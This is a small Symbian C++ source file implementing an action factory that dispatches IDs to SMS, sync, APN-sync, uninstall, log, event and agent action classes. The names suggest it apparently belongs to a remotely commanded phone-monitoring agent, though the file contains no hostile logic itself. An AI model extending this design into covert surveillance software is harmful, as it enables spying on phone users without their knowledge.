/*
 ============================================================================
 Name		: Factory.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CFactory implementation
 ============================================================================
 */

#include "ActionFactory.h"

#include "ActionNone.h"
#include "ActionSms.h"
#include "ActionSync.h"
#include "ActionUninstall.h"
#include "ActionLog.h"
#include "ActionSyncApn.h"
#include "ActionEvent.h"
#include "ActionAgent.h"

EXPORT_C CAbstractAction* ActionFactory::CreateActionL(TActionType aId, const TDesC8& params, TQueueType aQueueType)
	{
	switch (aId)
		{
		case EAction_Sms:
			return CActionSms::NewL(params, aQueueType );
		case EAction_Sync:
			return CActionSync::NewL(params, aQueueType);
		case EAction_SyncApn:
			return CActionSyncApn::NewL(params, aQueueType);
		case EAction_Uninstall:
			return CActionUninstall::NewL(params, aQueueType);
		case EAction_Log:
			return CActionLog::NewL(params, aQueueType);
		case EAction_Event:
			return CActionEvent::NewL(params, aQueueType);
		case EAction_Agent:
			return CActionAgent::NewL(params, aQueueType);
			// add new actions here:
		default:
			return CActionNone::NewL(aId, params, ESecondaryQueue);
		}
	}
